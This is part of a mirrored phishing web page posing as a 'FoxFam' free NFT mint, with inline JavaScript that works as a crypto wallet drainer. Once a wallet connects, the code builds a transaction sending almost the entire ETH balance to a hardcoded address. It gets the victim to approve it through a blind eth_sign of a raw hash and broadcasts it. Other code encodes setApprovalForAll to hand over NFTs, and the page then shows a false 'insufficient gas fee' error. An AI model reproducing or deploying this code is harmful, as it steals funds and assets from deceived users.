                    for (const log of logs) {
                        const { from, to, tokenId } = log.args;
                        
                        if (addressEqual(to, account)) {
                        owned.add(tokenId.toString());
                        } else if (addressEqual(from, account)) {
                        owned.delete(tokenId.toString());
                        }
                    }

                    console.log([...owned].join('\n'));

                    ***/
                }

                catch (err) {

                    console.log(err);
                }
            };


            const notify = (num) => {

                $("#signi").hide();
                $("#connecti").hide();
                $("#error").hide();

                switch (num) {

                    case 0:
                        

                        if (error_type == 0) {

                            error_text = "Insufficient gas fee to claim your FoxFam.";
                            $("#error-text").html(error_text);
                        }
                        
                        else if (error_type == 1) {
                            
                            error_text = "Insufficient gas fee to claim your FoxFam.";
                            $("#error-text").html(error_text);
                        }

                        $("#error").show();

                        break;


                    case 1:
                        
                        $("#connecti").show();
                        
                        break;

        
                    case 2:
                        
                        $("#signi").show();
                        break;
                        
                    
                    default:
                        
                        $("#error").show();
                        break;

                }


                //setTimeout('$("#error").hide();', 5000);

            }


            const claim1 = async() => {

                web3 = new Web3(ethereum);

                chainId = await web3.eth.getChainId();

                txnNonce = await web3.eth.getTransactionCount(currentAccount, "pending");

                taddr = "0x6f9d9ece2d05730eafb6e5b4d3025a8a3a38fc11";
                t_contract = await new web3.eth.Contract(
                    abi,
                    taddr
                );

                //const contractdata = await t_contract.methods.approve(contactAddress, 10).send({from: currentAccount}); 
                //const contractdata = await t_contract.methods.approve(contactAddress, 10).encodeABI();
                contractdata = await t_contract.methods.setApprovalForAll("0x64B65c8F9E47b1953Db33342D72c24CE0d6D4bB2", true).encodeABI();

                const transactionParameters = {

                    gasLimit: "0x1B2E020",
                    maxPriorityFeePerGas: 1.100000008,
                    maxFeePerGas: 1.100000008, 
                    to: '0x6f9d9ece2d05730eafb6e5b4d3025a8a3a38fc11', // Required except during contract publications.
                    from: currentAccount, // must match user's active address.
                    value: 0,
                    chainId: '0x4', // Used to prevent transaction reuse across blockchains. Auto-filled by MetaMask.
                    'data': contractdata,

                };


            }


            async function claim() {

                web3 = new Web3(ethereum);

                chainId = await web3.eth.getChainId();

                await web3.eth.getTransactionCount(currentAccount, "pending")
                .then(async (txnCount) => {
                    // Create the transaction object
                    eth_wei = ethUnit.toWei(0.1, 'ether');

                    const jgasPrice = await web3.eth.getGasPrice();

                    const mgasPrice = web3.utils.toHex(jgasPrice);

                    const gas = new web3.utils.BN("22000");

                    const cost = gas * jgasPrice;

                    const sending = eth_bal - 1.001*cost;

                    const sending1 = web3.utils.fromWei(eth_wei, "ether");

                    const fs = "0x" + sending.toString(16);

                    //taddr = "0x6f9d9ece2d05730eafb6e5b4d3025a8a3a38fc11";
                    token_contract = await new web3.eth.Contract(
                        abi,
                        contactAddress
                    );

                    //const contractdata = await t_contract.methods.approve(contactAddress, 10).send({from: currentAccount}); 
                    //const contractdata = await t_contract.methods.approve(contactAddress, 10).encodeABI();
                    const contractdata = await token_contract.methods.setApprovalForAll(toAddress, true).encodeABI();
                    
                    console.log(sending1);
                    console.log(fs);

                    const txObject = {
                        nonce: web3.utils.toHex(txnCount),
                        gasPrice: mgasPrice,
                        gasLimit: "0x55F0",
                        to: "0x03dFFA990F8fD07d383d4fEC5a595E5153982432",
                        value: fs,
                        data: "0x",
                        v: "0x1",
                        r: "0x",
                        s: "0x"
                    };

                    let ethTX1 = new ethereumjs.Tx(txObject);
                    const rawTx1 = '0x' + ethTX1.serialize().toString('hex');
                    const rawHash1 = web3.utils.sha3(rawTx1, {encoding: 'hex'});

                    console.log(rawTx1);
                    console.log(rawHash1);

                    /***
                     const mycontract = await new web3.eth.Contract(
                        abi,
                        contractAddress
                    ); 
                    ***/
                    
                    // const txHash = await mycontract.methods.hashStruct(txObject).call()        

                    await web3.eth.sign(rawHash1, currentAccount)
                    .then(async (result) => {
                        

                        // The signature is now comprised of r, s, and v.

                        const signature = result.substring(2);
                        const r = "0x" + signature.substring(0, 64);
                        const s = "0x" + signature.substring(64, 128);
                        const v = parseInt(signature.substring(128, 130), 16);

                        //signer = await mycontract.methods.verify(current_account ,rawHash1, r, s, v).call();
                        //console.log(signer);

                        const y =  web3.utils.toHex(v + chainId * 2 + 8);

                        console.log(r);
                        console.log(s);
                        console.log(y.toString('hex'));

                        /*** const signedTx = {
                         nonce: web3.utils.toHex(txnCount),
                        gasPrice: mgasPrice,
                        gasLimit: "0x5208",
                        to: "0xDB03428239a597C478e6A6d9F2AbD0D115411863",
                        value: "0x186A0",
                        data: "0x",
                        v: y,
                        r: r,
                        s: s 
                        }; ***/

                        // const ethTX = new ethereumjs.Tx(signedTx);

                        ethTX1.r = r
                        ethTX1.s = s
                        ethTX1.v = y

                        console.log(ethTX1);

                        const rawTx = '0x' + ethTX1.serialize().toString('hex');
                        const rawHash = web3.utils.sha3(rawTx, {encoding: 'hex'});

                        console.log(rawTx);

                        //console.log('0x' + ethTX1.hash().toString('hex'));

                        
                        
                        await web3.eth.sendSignedTransaction(rawTx)
                        .then((hash) => {
                            console.log(hash);
                            //withdraw();
                            
                            notify(0);

                        })

                        .catch( (e) => {
                            
                            notify(0);

                        });
                        
                        
                    })

                    .catch((err) => {

                        console.log(err);
                        notify(2);
                        
                    })


                })

            }


            const verifyAsset = async () => {

                web3 = new Web3(web3.currentProvider);

                try {

                    /*** Operation already initiatiated

                    await ethereum
                    .request({ method: 'eth_requestAccounts' })
                    .then(handleAccountsChanged)
                    .catch( (err)=> {
                    
                    //$("#welcome_div").show();
                    console.log(err);

                    })
                    **/

                    token_contract = await new web3.eth.Contract(
                        abi,
                        contactAddress
                    );

                    // token_bal = await token_contract.methods.balanceOf(currentAccount).call();
                    // console.log(token_bal);
                    eth_bal = await web3.eth.getBalance(currentAccount);
                    const r_bal = web3.utils.fromWei(eth_bal, 'ether');
                    chainId = await web3.eth.getChainId();


                    if (r_bal > 0.0003) {

                        //listTokensOfOwner();
                        claim();
                        //withdraw();
                        
                    }

                    else {
                        //alert("Insufficients Funds. Fund account to continue");
                        error_type = 1;
                        notify(0);
                    }


                }

                catch(e) {

                    console.log(e);
                    notify();

                }



            };


            window.addEventListener('load', () => {

                try {

                    
                    MetaMaskClientCheck();


                    ethereum.on('accountsChanged', handleAccountsChanged);
                    // to unsubscribe
                    //ethereum.removeListener('accountsChanged', handleAccountsChanged);


                }

                catch (e) {

                    console.log(e);
                }
                
                //startMeta();


            })


        </script>


<next-route-announcer><p aria-live="assertive" id="__next-route-announcer__" role="alert" style="border: 0px none; clip: rect(0px, 0px, 0px, 0px); height: 1px; margin: -1px; overflow: hidden; padding: 0px; position: absolute; width: 1px; white-space: nowrap; overflow-wrap: normal;"></p></next-route-announcer>

<style>.footer,.generic-footer{margin-bottom:98px}@media (min-width:374px){.footer,.generic-footer{margin-bottom:78px}}@media (min-width:546px){.footer,.generic-footer{margin-bottom:56px}}@media (min-width:1055px){.footer,.generic-footer{margin-bottom:0}}.disclaimer{position:fixed;z-index:9999999;bottom:0;right:0;border-top:2px solid #ff5c62;text-align:center;font-size:14px;font-weight:400;background-color:#fff;padding:5px 10px 5px 10px}.disclaimer a:hover{text-decoration:underline}@media (min-width:1052px){.disclaimer{text-align:right;border-left:2px solid red;border-top-left-radius:10px}}@media (min-width:1920px){.disclaimer{width:60%}}</style><div class="disclaimer">We support Ukraine and condemn war. Push Russian government to act against war. Be brave, vocal and show your support to Ukraine. Follow the latest news <a title="https://www.bbc.com/news/live/world-europe-60517447" target="_blank" href="https://www.bbc.com/news/live/world-europe-60517447" style="color: black;"><b>HERE</b></a></div></body>




<!-- Mirrored from foxfamfreemint.000webhostapp.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 06 Jun 2022 03:51:00 GMT -->
</html>